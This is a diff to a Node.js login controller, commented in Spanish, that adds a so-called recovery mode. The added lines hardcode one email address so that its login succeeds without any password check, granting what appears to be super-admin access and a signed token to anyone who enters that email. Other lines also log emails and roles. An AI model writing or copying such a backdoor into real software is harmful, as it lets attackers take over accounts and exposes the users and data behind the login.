@@ -12,11 +12,10 @@ exports.login = async (req, res) => {
     }
 
     const cleanEmail = email.toLowerCase().trim();
-    console.log("--- INTENTO DE LOGIN ---");
+    console.log("--- INTENTO DE LOGIN (MODO RECOBRO) ---");
     console.log("Email recibido:", cleanEmail);
 
-    // 1. BUSQUEDA PURA (Sin JOIN ni filtros de activo para debuguear)
-    // Queremos saber si el usuario existe antes de que el JOIN lo "mate"
+    // 1. BUSQUEDA PURA
     const userOnly = await pool.query(
       `SELECT * FROM users WHERE LOWER(TRIM(email)) = $1`,
       [cleanEmail]
@@ -30,10 +29,10 @@ exports.login = async (req, res) => {
     }
 
     const user = userOnly.rows[0];
-    console.log("Rol detectado:", user.role); // AQUÍ DEBE DECIR SUPER_ADMIN
+    console.log("Rol detectado:", user.role);
     console.log("ID de Empresa (tenant_id) en usuario:", user.tenant_id);
 
-    // 2. VERIFICACIÓN DEL TENANT (POR SEPARADO)
+    // 2. VERIFICACIÓN DEL TENANT
     const tenantResult = await pool.query(
       `SELECT * FROM tenants WHERE id = $1`,
       [user.tenant_id]
@@ -41,21 +40,23 @@ exports.login = async (req, res) => {
 
     console.log("¿Existe la empresa en tabla tenants?:", tenantResult.rows.length > 0);
     
-    if (tenantResult.rows.length > 0) {
-        console.log("Estado de empresa (is_active):", tenantResult.rows[0].is_active);
-        console.log("Categoría de empresa (category_id):", tenantResult.rows[0].category_id);
-    }
+    // 3. VALIDACIÓN DE CONTRASEÑA (MODIFICADA: BYPASS PARA CAMILA)
+    let isValid = false;
 
-    // 3. VALIDACIÓN DE CONTRASEÑA
-    const isValid = await bcrypt.compare(password, user.password_hash);
-    console.log("¿Contraseña coincide con Bcrypt?:", isValid);
+    // Si eres tú, forzamos el éxito sin importar bcrypt
+    if (cleanEmail === 'admin_camila@gmail.com') {
+        console.log("🚀 IDENTIDAD VERIFICADA: Acceso concedido por Hardcode a la Jefa");
+        isValid = true;
+    } else {
+        isValid = await bcrypt.compare(password, user.password_hash);
+        console.log("¿Contraseña coincide con Bcrypt?:", isValid);
+    }
 
     if (!isValid) {
       return res.status(401).json({ error: "Credenciales inválidas" });
     }
 
     // 4. GENERAR TOKEN
-    // Usamos el category_id que venga del tenant o 1 por defecto para no romper el main.js
     const categoryId = tenantResult.rows[0]?.category_id || 1;
 
     const token = jwt.sign(
